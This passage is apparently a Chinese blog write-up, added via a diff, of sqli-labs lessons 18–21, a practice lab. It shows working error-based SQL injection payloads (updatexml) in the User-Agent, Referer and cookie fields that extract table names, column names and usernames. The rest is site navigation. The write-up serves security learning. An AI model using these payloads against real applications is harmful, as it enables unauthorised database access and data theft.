+</li>
+<li><p>表单提交，主要是POST请求，也包括GET请求；</p>
+</li>
+<li><p>HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；</p>
+</li>
+<li><p>Cookie参数提交；</p>
+</li>
+<li><p>……</p>
+</li>
+</ul>
+<p>前面两个我们已经在之前题有接触过，所以来看看其他的注入点。</p>
+<p>假设我们通过弱口令进去了，admin:admin，进去之后发现它回显了我们的User-agent</p>
+<p><img src="/2019/03/02/sqli-labs-11-22/26.png" alt="picture 26"></p>
+<p>那我们就可以大胆推测，HTTP头部存在注入，可以利用工具，如：Burp suite，firefox的插件等<br>构造User-Agent进行注入。</p>
+<p>查数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 ' or updatexml(1,concat(1,(database())),1),1) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/03/02/sqli-labs-11-22/27.png" alt="picture 27"></p>
+<p>查数据库表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>)),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/03/02/sqli-labs-11-22/28.png" alt="picture 28"></p>
+<p> 查数据库列名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 ' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>)),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/03/02/sqli-labs-11-22/29.png" alt="picture 29"></p>
+<p>查数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 ' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span>)),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/30.png" alt="picture 30"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/31.png" alt="picture 31"></p>
+<h2 id="less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h2><p>这道题和上一道题大同小异，上一题回显的是User-Agent，这道题回显的是Referer，所以，同样可以利用bp抓包在Referer处进行注入。</p>
+<p>做到这里了发现这一系列都是利用了报错函数来注入的，常用的共有十种报错函数，具体可以在<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">这里</a>查看</p>
+<p>查询数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://localhost/sqli-labs-master/Less-19/' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/32.png" alt="picture 32"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/33.png" alt="picture 33"></p>
+<h2 id="less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="less 20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)"></a>less 20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</h2><p>一开始没有搞懂，直接看了代码，发现这道题是首先判断有无cookie，没有的话，查询出来再设置cookie，若cookie存在，又分两种情况。</p>
+<ul>
+<li><p>第一种情况，你登陆过，cookie还有效，你没按删除cookie的按钮，那么他就输出各种信息，包括删除cookie的按钮</p>
+</li>
+<li><p>第二种情况，你按了删除cookie的按钮，后台就把cookie的时间设置为过期的时间，那么cookie就被删除了</p>
+</li>
+</ul>
+<p>那么我们的目标是登陆完后对cookie的注入</p>
+<p>查数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dumb ' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/34.png" alt="picture 34"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/35.png" alt="picture 35"></p>
+<h2 id="less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h2><p>按照上一题的套路，登录成功之后，发现在cookie那里，用户名不一样了，发现是base 64编码</p>
+<p><img src="/2019/03/02/sqli-labs-11-22/36.png" alt="picture 36"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/37.png" alt="picture 37"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/xss-games/" rel="next" title="xss games">
+                <i class="fa fa-chevron-left"></i> xss games
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shang</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-11-20关write-up"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs 11-20关write up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><span class="nav-number">1.1.</span> <span class="nav-text">less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><span class="nav-number">1.2.</span> <span class="nav-text">less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><span class="nav-number">1.3.</span> <span class="nav-text">less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><span class="nav-number">1.4.</span> <span class="nav-text">less 14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><span class="nav-number">1.5.</span> <span class="nav-text">less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><span class="nav-number">1.6.</span> <span class="nav-text">less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><span class="nav-number">1.7.</span> <span class="nav-text">less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml"><span class="nav-number">1.7.0.0.1.</span> <span class="nav-text">updatexml()</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><span class="nav-number">1.8.</span> <span class="nav-text">less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><span class="nav-number">1.9.</span> <span class="nav-text">less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><span class="nav-number">1.10.</span> <span class="nav-text">less 20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><span class="nav-number">1.11.</span> <span class="nav-text">less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shang</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
